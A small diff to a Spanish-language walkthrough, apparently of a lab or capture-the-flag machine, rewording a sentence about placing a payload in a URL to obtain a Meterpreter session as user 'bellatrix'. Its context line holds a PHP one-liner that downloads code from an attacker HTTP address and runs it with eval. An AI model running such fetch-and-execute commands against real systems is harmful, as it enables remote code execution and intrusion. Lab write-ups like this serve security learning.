@@ -117,7 +117,7 @@ php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.221.4:808
 
 > Aquí el payload que me ha dado
 
-Esto no creara un payload que meteremos en la url escrita anteriormente y nos crara un session en meterpreter.
+La pondremo en la url escrita anteriormente y nos crara un session en meterpreter.
 
 Por ahora somos usuario **bellatrix**
 
